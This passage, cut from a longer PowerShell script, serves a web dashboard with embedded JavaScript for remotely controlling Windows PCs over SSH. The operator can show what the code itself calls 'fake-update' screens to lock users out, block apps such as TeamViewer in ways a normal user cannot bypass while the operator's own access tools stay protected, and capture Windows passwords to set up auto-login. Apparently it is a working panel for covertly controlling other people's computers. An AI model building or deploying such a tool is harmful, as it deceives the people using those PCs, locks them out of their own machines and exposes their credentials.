  if(s==='locked'){el.style.background='#123a22';el.style.color='#5fe08a';el.textContent='LOCKED - update screen is showing on the client';}
  else if(s==='unlocked'){el.style.background='#33262a';el.style.color='#e0868f';el.textContent='Not locked - client screen is normal';}
  else{el.style.background='#2a2410';el.style.color='#e0c06a';el.textContent='Could not check (client unreachable) - trying again...';}}catch(e){el.textContent='Status unknown';}
}
async function loadLock(){
  checkLock();
  try{const r=await fetch('/api/lockget?ip='+sel.ip);const j=await r.json();
  if(j.text)document.getElementById('lktext').value=j.text;
  if(j.color)document.getElementById('lkcolor').value=j.color;
  if(j.image)document.getElementById('lkimg').value=j.image;}catch(e){}
}
async function saveLock(){
  showProg(0,1,'Saving settings to '+sel.name+'...');
  const body={ip:sel.ip,text:document.getElementById('lktext').value,color:document.getElementById('lkcolor').value,image:document.getElementById('lkimg').value};
  try{const r=await fetch('/api/lockset',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
  await r.json();updProg(1,1,'Saved. Now press "Lock screen".');setTimeout(hideProg,2500);}catch(e){hideProg();alert('Error: '+e);}
}
async function rename(){
  const n=prompt('New name for this client:',sel.name);if(!n)return;
  await fetch('/api/rename',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:sel.host,ip:sel.ip,name:n})});
  sel.name=n;await load();panel();
}
async function upgradeAll(){
  if(!confirm('Push the latest update to ALL online clients now?'))return;
  const online=clients.filter(c=>c.online);
  showProg(0,online.length,'Starting...');
  let done=0;
  for(const c of online){
    updProg(done,online.length,'Upgrading '+c.name+' ...');
    try{await fetch('/api/action',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:c.ip,action:'upgrade'})});}catch(e){}
    done++; updProg(done,online.length,'Upgrading '+c.name+' ...');
  }
  updProg(online.length,online.length,'Done - '+online.length+' upgraded. Offline clients auto-update within 30 min.');
  setTimeout(hideProg,4000); load();
}
function showProg(d,t,msg){let o=document.getElementById('progWrap');if(!o){o=document.createElement('div');o.id='progWrap';o.style.cssText='position:fixed;left:50%;top:20px;transform:translateX(-50%);width:420px;max-width:90%;background:#161d2e;border:1px solid #295596;border-radius:10px;padding:14px 16px;z-index:9999;box-shadow:0 8px 30px rgba(0,0,0,.5)';o.innerHTML='<div id="progMsg" style="font-size:13px;color:#dfe6f2;margin-bottom:10px">'+msg+'</div><div style="height:10px;background:#0f1420;border-radius:6px;overflow:hidden"><div id="progBar" style="height:100%;width:0%;background:#3b82f6;transition:width .3s"></div></div><div id="progPct" style="font-size:11px;color:#8fa0c0;margin-top:6px;text-align:right">0%</div>';document.body.appendChild(o);}updProg(d,t,msg);}
function updProg(d,t,msg){const bar=document.getElementById('progBar');const pm=document.getElementById('progMsg');const pp=document.getElementById('progPct');if(!bar)return;const pct=t?Math.round(d/t*100):100;bar.style.width=pct+'%';if(pm&&msg)pm.textContent=msg;if(pp)pp.textContent=pct+'% ('+d+'/'+t+')';}
function hideProg(){const o=document.getElementById('progWrap');if(o)o.remove();}
async function newClient(){
  let link='';try{const r=await fetch('/api/setuplink');link=(await r.json()).link;}catch(e){}
  if(!link||link.indexOf('PASTE_')===0){alert('No setup link is set yet. Add your cloud link in dashboard.ps1 ($setupLink).');return;}
  let o=document.getElementById('ncWrap');if(o)o.remove();
  o=document.createElement('div');o.id='ncWrap';
  o.style.cssText='position:fixed;left:50%;top:80px;transform:translateX(-50%);width:520px;max-width:92%;background:#161d2e;border:1px solid #2e7d46;border-radius:12px;padding:18px;z-index:9999;box-shadow:0 10px 40px rgba(0,0,0,.6)';
  o.innerHTML='<div style="font-size:14px;color:#eef2f8;font-weight:600;margin-bottom:6px">Add a new client</div>'+
    '<div style="font-size:12px;color:#8fa0c0;margin-bottom:12px">Paste this link into the new PC\'s browser. It downloads the setup file. Then run it once.</div>'+
    '<input id="ncLink" readonly value="'+link.replace(/"/g,'&quot;')+'" style="width:100%;padding:10px;border-radius:6px;border:1px solid #2c3752;background:#0f1420;color:#e6eaf2;font-size:12.5px;margin-bottom:12px">'+
    '<button id="ncCopy" style="padding:9px 16px;border-radius:7px;border:1px solid #2e7d46;background:#173d26;color:#8fe0a8;font-size:13px;cursor:pointer">Copy link</button>'+
    '<button onclick="document.getElementById(\'ncWrap\').remove()" style="padding:9px 16px;border-radius:7px;border:1px solid #2c3752;background:none;color:#9fb0d0;font-size:13px;cursor:pointer;margin-left:8px">Close</button>';
  document.body.appendChild(o);
  const inp=document.getElementById('ncLink');inp.focus();inp.select();
  document.getElementById('ncCopy').onclick=()=>{inp.select();try{navigator.clipboard.writeText(link);}catch(e){document.execCommand('copy');}document.getElementById('ncCopy').textContent='Copied!';};
}
async function autoLogin(){
  const p=prompt("Enter the CURRENT Windows password for this PC's user (the one you last set).\n\nLeave empty if the account has no password.\n\nThis makes the PC skip the login screen from now on.");
  if(p===null)return;
  const o=document.getElementById('out');if(o)o.textContent='Setting up auto-login...';
  try{const r=await fetch('/api/autologin',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:sel.ip,pass:p})});const j=await r.json();if(o)o.textContent=j.output||'Done';}catch(e){if(o)o.textContent='Error: '+e;}
}
let appCache={};
async function appMgr(force){
  const ip=sel.ip;
  if(!force && appCache[ip]){showAppModal(appCache[ip].apps,new Set(appCache[ip].blocked),new Set(appCache[ip].prot),sel.name,ip);return;}
  const o=document.getElementById('out');if(o)o.textContent='Scanning apps on '+sel.name+' ...';
  let apps=[],blocked=[],prot=[],bmsg='';
  try{const r=await fetch('/api/appscan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,force:!!force})});const j=await r.json();
    apps=JSON.parse(j.apps||'[]');blocked=JSON.parse(j.blocked||'[]');prot=(j.protected||'').split(',');bmsg=j.blockmsg||'';}catch(e){if(o)o.textContent='Scan failed: '+e;return;}
  if(!Array.isArray(apps))apps=apps?[apps]:[];
  if(!Array.isArray(blocked))blocked=blocked?[blocked]:[];
  blocked=blocked.map(x=>(''+x).toLowerCase());prot=prot.map(x=>(''+x).toLowerCase());
  appCache[ip]={apps,blocked,prot,msg:bmsg};
  if(o)o.textContent='Ready.';
  showAppModal(apps,new Set(blocked),new Set(prot),sel.name,ip);
}
function appRow(name,exe,blocked,prot){
  let right;
  if(prot) right='<span style="font-size:11px;color:#6f7ea0;border:1px solid #2c3752;border-radius:6px;padding:6px 10px">Protected</span>';
  else if(blocked) right='<button onclick="appToggle(this,\''+exe+'\',false)" style="padding:6px 12px;border-radius:6px;border:1px solid #2e7d46;background:#173d26;color:#8fe0a8;cursor:pointer;font-size:12px">Blocked \u2713 unblock</button>';
  else right='<button onclick="appToggle(this,\''+exe+'\',true)" style="padding:6px 12px;border-radius:6px;border:1px solid #7a3a42;background:#241a1d;color:#e0868f;cursor:pointer;font-size:12px">Block</button>';
  return '<div class="appRow" data-exe="'+exe+'" data-name="'+(name||'').toLowerCase()+'" style="display:flex;align-items:center;gap:10px;padding:8px 6px;border-bottom:1px solid #1d2537;'+(blocked?'background:#1c1417;':'')+'">'+
    '<div style="flex:1"><div class="appName" style="font-size:13px;color:#eef2f8">'+esc(name)+'</div><div style="font-size:11px;color:#7d8aa5">'+esc(exe)+'</div></div>'+right+'</div>';
}
function showAppModal(apps,bset,pset,cname,ip){
  let o=document.getElementById('appWrap');if(o)o.remove();
  o=document.createElement('div');o.id='appWrap';o.dataset.ip=ip;
  o.style.cssText='position:fixed;left:50%;top:40px;transform:translateX(-50%);width:580px;max-width:94%;max-height:82vh;overflow:auto;background:#161d2e;border:1px solid #395182;border-radius:12px;padding:18px;z-index:9999;box-shadow:0 10px 40px rgba(0,0,0,.6)';
  const bl=apps.filter(a=>bset.has((a.exe||'').toLowerCase()));
  const rest=apps.filter(a=>!bset.has((a.exe||'').toLowerCase()));
  let head='';
  if(bl.length){head='<div style="font-size:12px;color:#e0868f;font-weight:600;margin:4px 0 6px">Blocked ('+bl.length+')</div>'+bl.map(a=>appRow(a.name,(a.exe||'').toLowerCase(),true,false)).join('')+'<div style="font-size:12px;color:#8fa0c0;font-weight:600;margin:14px 0 6px">All apps</div>';}
  let rows=rest.map(a=>{const ex=(a.exe||'').toLowerCase();return appRow(a.name,ex,false,pset.has(ex));}).join('');
  o.innerHTML='<div style="display:flex;align-items:center;gap:10px;margin-bottom:6px"><div style="font-size:15px;color:#fff;font-weight:600">Block apps on '+esc(cname)+'</div>'+
    '<button onclick="appMgr(true)" style="margin-left:auto;background:none;border:1px solid #2c3752;color:#9fb0d0;border-radius:6px;padding:5px 10px;cursor:pointer">Rescan</button>'+
    '<button onclick="fleetBlocked()" style="background:none;border:1px solid #395182;color:#9dc3ff;border-radius:6px;padding:5px 10px;cursor:pointer">All clients</button>'+
    '<button onclick="document.getElementById(\'appWrap\').remove()" style="background:none;border:1px solid #2c3752;color:#9fb0d0;border-radius:6px;padding:5px 10px;cursor:pointer">Close</button></div>'+
    '<div style="font-size:11px;color:#7d8aa5;margin-bottom:10px">Blocked apps won\'t open, survive reinstall, and can\'t be bypassed by a normal user. Protected apps (your access tools) can\'t be blocked.</div>'+
    '<div style="background:#141b2b;border:1px solid #263148;border-radius:8px;padding:10px;margin-bottom:12px"><div style="font-size:12px;color:#8fa0c0;margin-bottom:6px">Message shown when a blocked app is opened (leave empty = silent, nothing happens):</div>'+
    '<div style="display:flex;gap:6px"><input id="blockMsg" placeholder="e.g. This app is blocked. Do not use - contact CloudPulse IT." value="'+((appCache[ip]&&appCache[ip].msg)||'').replace(/"/g,"&quot;")+'" style="flex:1;padding:8px 10px;border-radius:6px;border:1px solid #2c3752;background:#0f1420;color:#e6eaf2;font-size:12.5px"><button onclick="saveBlockMsg()" style="padding:8px 14px;border-radius:6px;border:1px solid #295596;background:#1c3a6b;color:#fff;cursor:pointer;font-size:12.5px">Save message</button></div></div>'+
    '<input id="appSearch" placeholder="Filter apps..." oninput="appFilter()" style="width:100%;padding:8px 10px;border-radius:6px;border:1px solid #2c3752;background:#0f1420;color:#e6eaf2;font-size:13px;margin-bottom:10px">'+
    '<div style="display:flex;gap:6px;margin-bottom:12px"><input id="appManual" placeholder="or type an .exe to block (e.g. teamviewer.exe)" style="flex:1;padding:8px 10px;border-radius:6px;border:1px solid #2c3752;background:#0f1420;color:#e6eaf2;font-size:12.5px"><button onclick="appBlockManual()" style="padding:8px 12px;border-radius:6px;border:1px solid #7a3a42;background:#3a2226;color:#e0868f;cursor:pointer;font-size:12.5px">Block</button></div>'+
    '<div id="appList">'+head+(rows||'')+(apps.length?'':'<div style="color:#7d8aa5;font-size:12px;padding:10px">No apps found. Use the box above to block by name.</div>')+'</div>';
  document.body.appendChild(o);
}
async function appToggle(btn,exe,block){
  const ip=document.getElementById('appWrap').dataset.ip;
  const um=((document.getElementById('blockMsg')||{}).value||'').trim().length>0;
  btn.disabled=true;btn.textContent=block?'Blocking...':'Unblocking...';
  let msg='';try{const r=await fetch(block?'/api/appblock':'/api/appunblock',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,exe,usemsg:um})});msg=(await r.json()).output||'';}catch(e){}
  if(block&&msg.indexOf('Blocked ')!==0){alert(msg||'Block failed - no response from client.');btn.disabled=false;btn.textContent='Block';return;}
  if(appCache[ip]){const s=new Set(appCache[ip].blocked);if(block)s.add(exe);else s.delete(exe);appCache[ip].blocked=[...s];
    showAppModal(appCache[ip].apps,s,new Set(appCache[ip].prot),clients.find(c=>c.ip===ip)?.name||'',ip);}
}
async function saveBlockMsg(){
  const ip=document.getElementById('appWrap').dataset.ip;const v=(document.getElementById('blockMsg').value||'').trim();
  const btn=event.target;btn.textContent='Saving...';btn.disabled=true;
  let out='';try{const r=await fetch('/api/blockmsg',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,msg:v})});out=(await r.json()).output||'';}catch(e){}
  if(appCache[ip])appCache[ip].msg=v;
  btn.textContent='Saved';setTimeout(()=>{btn.textContent='Save message';btn.disabled=false;},1500);
}
function appFilter(){const q=(document.getElementById('appSearch').value||'').toLowerCase();document.querySelectorAll('#appList .appRow').forEach(r=>{r.style.display=(r.dataset.exe+r.dataset.name).includes(q)?'flex':'none';});}
async function appBlockManual(){const ip=document.getElementById('appWrap').dataset.ip;let v=(document.getElementById('appManual').value||'').trim().toLowerCase();if(!v)return;if(!v.endsWith('.exe'))v+='.exe';
  const um=((document.getElementById('blockMsg')||{}).value||'').trim().length>0;
  let msg='';try{const r=await fetch('/api/appblock',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,exe:v,usemsg:um})});msg=(await r.json()).output||'';}catch(e){}
  if(msg.indexOf('Blocked ')!==0){alert(msg||'Block failed - no response from client.');return;}
  document.getElementById('appManual').value='';
  if(appCache[ip]){const s=new Set(appCache[ip].blocked);s.add(v);appCache[ip].blocked=[...s];
    if(!appCache[ip].apps.some(a=>(a.exe||'').toLowerCase()===v))appCache[ip].apps.push({name:v,exe:v});
    showAppModal(appCache[ip].apps,s,new Set(appCache[ip].prot),clients.find(c=>c.ip===ip)?.name||'',ip);}
}
async function fleetBlocked(){
  let o=document.getElementById('appWrap');if(o)o.innerHTML='<div style="color:#9fb0d0;font-size:13px;padding:10px">Checking all clients...</div>';
  let data=[];try{const r=await fetch('/api/blockedall');data=JSON.parse((await r.json()).data||'[]');}catch(e){}
  if(!Array.isArray(data))data=data?[data]:[];
  let html='<div style="display:flex;align-items:center;gap:10px;margin-bottom:12px"><div style="font-size:15px;color:#fff;font-weight:600">Blocked apps - all clients</div><button onclick="document.getElementById(\'appWrap\').remove()" style="margin-left:auto;background:none;border:1px solid #2c3752;color:#9fb0d0;border-radius:6px;padding:5px 10px;cursor:pointer">Close</button></div>';
  if(!data.length)html+='<div style="color:#7d8aa5;font-size:12px;padding:10px">No apps are blocked on any online client.</div>';
  data.forEach(d=>{const bl=Array.isArray(d.blocked)?d.blocked:[d.blocked];
    html+='<div style="font-size:13px;color:#eef2f8;font-weight:600;margin:10px 0 4px">'+esc(d.name)+'</div>';
    bl.forEach(ex=>{html+='<div style="display:flex;align-items:center;gap:8px;padding:6px;border-bottom:1px solid #1d2537"><span style="flex:1;font-size:12.5px;color:#c9d4e6">'+esc(ex)+'</span><button onclick="fleetUnblock(this,\''+d.ip+'\',\''+ex+'\')" style="padding:5px 10px;border-radius:6px;border:1px solid #2e7d46;background:#173d26;color:#8fe0a8;cursor:pointer;font-size:12px">Unblock</button></div>';});
  });
  if(o)o.innerHTML=html;
}
async function fleetUnblock(btn,ip,exe){btn.disabled=true;btn.textContent='...';try{await fetch('/api/appunblock',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,exe})});}catch(e){}if(appCache[ip]){appCache[ip].blocked=appCache[ip].blocked.filter(x=>x!==exe);}btn.closest('div').style.opacity=.4;btn.textContent='Unblocked';}
let curMode='off';
function paintMode(active){
  curMode=active;
  const b=document.getElementById('tgBlue'),k=document.getElementById('tgBlack'),bad=document.getElementById('modeBadge');
  if(!b||!k||!bad)return;
  b.textContent=(active==='blue')?'ON':'OFF';
  k.textContent=(active==='black')?'ON':'OFF';
  b.style.outline=(active==='blue')?'2px solid #7fbfff':'none';
  k.style.outline=(active==='black')?'2px solid #999':'none';
  if(active==='blue'){bad.textContent='Blue active';bad.style.background='#123a5a';bad.style.color='#8fd0ff';}
  else if(active==='black'){bad.textContent='Black active';bad.style.background='#2a2a2a';bad.style.color='#e6e6e6';}
  else{bad.textContent='Off';bad.style.background='#2b3550';bad.style.color='#9fb0d0';}
}
async function toggleMode(mode){
  if(!sel)return;
  const target=(curMode===mode)?'off':mode;
  showProg(0,1, target==='off' ? ('Turning off update screen on '+sel.name+'...') : ('Showing '+target+' update screen on '+sel.name+'...'));
  paintMode(target);
  try{const r=await fetch('/api/lockmode',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:sel.ip,mode:target})});
  const j=await r.json();paintMode(j.active||target);
  updProg(1,1, target==='off' ? 'Update screen turned off.' : (target+' update screen is now showing.'));
  setTimeout(hideProg,2200);setTimeout(checkLock,1500);}catch(e){hideProg();paintMode(curMode);}
}
let deadHits=0;
async function ping(){
  try{await fetch('/api/heartbeat',{cache:'no-store'});deadHits=0;}
  catch(e){deadHits++;if(deadHits>=2)showDead();}
}
function showDead(){
  if(document.getElementById('deadWrap'))return;
  const o=document.createElement('div');o.id='deadWrap';
  o.style.cssText='position:fixed;inset:0;background:#0b0f18;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:99999;text-align:center;padding:20px';
  o.innerHTML='<div style="font-size:20px;color:#fff;font-weight:600;margin-bottom:10px">Reconnecting...</div><div style="font-size:14px;color:#8fa0c0">Dashboard is restarting - this page will come back on its own.</div><div style="font-size:12px;color:#5a6577;margin-top:14px">If nothing happens after a minute, double-click DASHBOARD.bat.</div>';
  document.body.appendChild(o);
  const retry=setInterval(async()=>{
    try{await fetch('/api/heartbeat',{cache:'no-store'});clearInterval(retry);location.reload();}catch(e){}
  },2000);
}
function esc(s){return (s||'').replace(/[&<>]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[m]));}
function timeAgo(iso){
  if(!iso)return'unknown';
  const d=new Date(iso);if(isNaN(d))return'unknown';
  const s=Math.floor((Date.now()-d.getTime())/1000);
  if(s<60)return'just now';
  if(s<3600)return Math.floor(s/60)+'m ago';
  if(s<86400)return Math.floor(s/3600)+'h ago';
  return Math.floor(s/86400)+'d ago';
}
load();setInterval(load,8000);setInterval(ping,3000);setInterval(function(){if(sel&&document.getElementById('lockStatus'))checkLock();},5000);
</script></body></html>
'@

# ---------- server ----------
$listener = New-Object System.Net.HttpListener
$prefix = "http://127.0.0.1:$port/"
$listener.Prefixes.Add($prefix)
try { $listener.Start() } catch { Write-Host "Could not start on $prefix - maybe already running?"; exit }
Write-Host "Dashboard running at $prefix   (close this window to stop)"
Start-Process $prefix

# When this window is closed (X button / Ctrl+C / logoff), drop every fake-update
# screen so no client is left stuck on the update screen.
try {
    [Console]::TreatControlCAsInput = $false
    $null = Register-ObjectEvent -InputObject ([Console]) -EventName CancelKeyPress -Action { Unlock-All } -ErrorAction SilentlyContinue
} catch {}
$null = Register-EngineEvent -SourceIdentifier ([System.Management.Automation.PsEngineEvent]::Exiting) -Action { Unlock-All } -ErrorAction SilentlyContinue
# Also handle the console-close (X) via a Win32 control handler.
try {
Add-Type -Namespace Win32 -Name Con -MemberDefinition @'
public delegate bool Handler(int sig);
[System.Runtime.InteropServices.DllImport("kernel32.dll")]
public static extern bool SetConsoleCtrlHandler(Handler h, bool add);
'@ -ErrorAction SilentlyContinue
$script:ctrlHandler = [Win32.Con+Handler]{ param($sig) Unlock-All; return $false }
[Win32.Con]::SetConsoleCtrlHandler($script:ctrlHandler, $true) | Out-Null
} catch {}

function Send($ctx, $text, $type='text/html; charset=utf-8') {
    $buf = [Text.Encoding]::UTF8.GetBytes($text)
    $ctx.Response.ContentType = $type
    $ctx.Response.ContentLength64 = $buf.Length
    $ctx.Response.OutputStream.Write($buf, 0, $buf.Length)
    $ctx.Response.OutputStream.Close()
}
function Body($ctx) { (New-Object IO.StreamReader($ctx.Request.InputStream)).ReadToEnd() | ConvertFrom-Json }

while ($true) {
    try {
        $ctx = $listener.GetContext()
    } catch {
        if (-not $listener.IsListening) {
            try { $listener.Start() } catch { Start-Sleep -Seconds 2 }
        }
        continue
    }
    $path = $ctx.Request.Url.AbsolutePath
    try {
        if ($path -eq '/') { Send $ctx $html }
        elseif ($path -eq '/api/clients') { Send $ctx ((Get-Clients | ConvertTo-Json -Compress)) 'application/json' }
        elseif ($path -eq '/api/heartbeat') { Send $ctx (@{ locked = (Heartbeat) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/action') {
            $b = Body $ctx; Send $ctx (@{ output = (Do-Action $b.ip $b.action) } | ConvertTo-Json -Compress) 'application/json'
        }
        elseif ($path -eq '/api/blockedall') { Send $ctx (@{ data = (Blocked-All) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/appscan') { $b = Body $ctx; $c = Get-AppScan $b.ip ([bool]$b.force); Send $ctx (@{ apps = $c.apps; blocked = $c.blocked; protected = ($protectedApps -join ','); blockmsg = $c.blockmsg } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/appblock') { $b = Body $ctx; Send $ctx (@{ output = (Block-App $b.ip $b.exe $b.usemsg) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/blockmsg') { $b = Body $ctx; Send $ctx (@{ output = (Set-BlockMsg $b.ip $b.msg) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/appunblock') { $b = Body $ctx; Send $ctx (@{ output = (Unblock-App $b.ip $b.exe) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/autologin') { $b = Body $ctx; Send $ctx (@{ output = (Set-AutoLogin $b.ip $b.pass) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/autologinoff') { $b = Body $ctx; Send $ctx (@{ output = (Clear-AutoLogin $b.ip) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/setuplink') { Send $ctx (@{ link = $setupLink } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/upgradeall') { Send $ctx (@{ output = (Upgrade-All) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/lockstatus') { $ip = $ctx.Request.QueryString['ip']; Send $ctx (@{ status = (Lock-Status $ip) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/lockget') {
            $ip = $ctx.Request.QueryString['ip']; Send $ctx ((Get-Lock $ip) | ConvertTo-Json -Compress) 'application/json'
        }
        elseif ($path -eq '/api/lockset') {
            $b = Body $ctx; Send $ctx (@{ output = (Set-Lock $b.ip $b.text $b.color $b.image) } | ConvertTo-Json -Compress) 'application/json'
        }
        elseif ($path -eq '/api/lockmode') {
            # body: {ip, mode:'blue'|'black'|'off'}  -> off = unlock; blue/black = set style + lock
            $b = Body $ctx
            if ($b.mode -eq 'off') {
                Do-Action $b.ip 'unlock' | Out-Null
                Send $ctx (@{ active = 'off' } | ConvertTo-Json -Compress) 'application/json'
            } else {
                # Set the style FIRST, then (re)show the screen. If a screen is already up,
                # drop it briefly so it re-opens in the new colour instead of keeping the old one.
                $m = (Set-LockMode $b.ip $b.mode)
                if ($script:lockedClients.ContainsKey($b.ip)) {
                    SSH-Run $b.ip 'cmd /c del /f /q C:\ProgramData\RemoteSupport\LOCK.flag' | Out-Null
                    Start-Sleep -Milliseconds 500
                }
                Do-Action $b.ip 'lock' | Out-Null
                Send $ctx (@{ active = $m } | ConvertTo-Json -Compress) 'application/json'
            }
        }
        elseif ($path -eq '/api/lockmodeget') {
            $ip = $ctx.Request.QueryString['ip']
            $st = (Lock-Status $ip)
            $active = if ($st -eq 'locked') { (Get-LockMode $ip) } else { 'off' }
            Send $ctx (@{ active = $active; status = $st } | ConvertTo-Json -Compress) 'application/json'
        }
        elseif ($path -eq '/api/rename') {
            $b = Body $ctx; Save-Name $b.host $b.name; Send $ctx (@{ ok = $true } | ConvertTo-Json -Compress) 'application/json'
        }
        else { $ctx.Response.StatusCode = 404; Send $ctx 'not found' 'text/plain' }
    } catch {
        Send $ctx (@{ output = "Error: $($_.Exception.Message)" } | ConvertTo-Json -Compress) 'application/json'
    }
}
